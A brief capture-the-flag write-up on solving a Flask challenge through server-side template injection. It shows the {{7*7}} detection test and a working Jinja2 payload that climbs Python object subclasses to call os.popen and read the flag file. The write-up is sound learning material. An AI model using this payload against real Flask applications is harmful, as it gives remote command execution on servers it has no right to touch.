the description says its a flask app
and there is an input field and no source code this must be an SSTI stands for (server side template injection) vulnerability

we can verify by sending {{7*7}} in the input field and it will say

```
Woooow, is it really 49
```

aww how is that possible so we look for some ssti payloads and after some testing this worked for me
```
{{().__class__.__bases__[0].__subclasses__()[226]()._module.__builtins__["__import__"]("os").popen('cat+.Flag.txt').read()}}
```


NOTE:
im sure that there is a lot of payloads that will work for you
